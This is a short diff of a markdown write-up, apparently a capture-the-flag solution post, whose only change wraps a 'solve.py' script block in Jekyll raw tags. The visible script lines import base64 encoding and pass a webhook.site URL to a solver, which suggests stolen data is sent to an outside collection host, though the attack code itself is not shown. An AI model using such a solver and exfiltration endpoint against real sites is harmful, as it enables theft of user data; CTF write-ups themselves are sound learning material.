@@ -571,6 +571,7 @@ Oh also, to automate the above steps, I wrote the following Python script to gen
 
 <details><summary><strong>solve.py</strong></summary>
 
+{% raw %}
 ```python
 #!/usr/bin/env python3
 from base64 import b64encode
@@ -610,6 +611,7 @@ if __name__ == '__main__':
     webhookUrl = 'https://webhook.site/1ded601d-f3f1-40eb-a99c-ab9746346425'
     solver.solve(webhookUrl)
 ```
+{% endraw %}
 
 </details>
 
